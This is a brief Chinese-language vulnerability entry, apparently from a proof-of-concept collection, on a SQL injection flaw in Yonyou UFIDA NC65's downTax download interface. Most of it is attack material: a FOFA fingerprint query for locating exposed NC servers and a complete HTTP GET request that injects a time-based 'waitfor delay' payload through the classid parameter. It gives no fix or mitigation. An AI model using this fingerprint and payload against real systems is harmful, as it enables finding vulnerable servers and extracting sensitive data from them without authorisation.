## 用友NC-downTax存在SQL注入漏洞

NC65系统可利用/portal/pt/downTax/download接口中的classid参数进行sql注入，从而窃取服务器的敏感信息。

## fofa

```
app="用友-UFIDA-NC"
```

## poc

```
GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

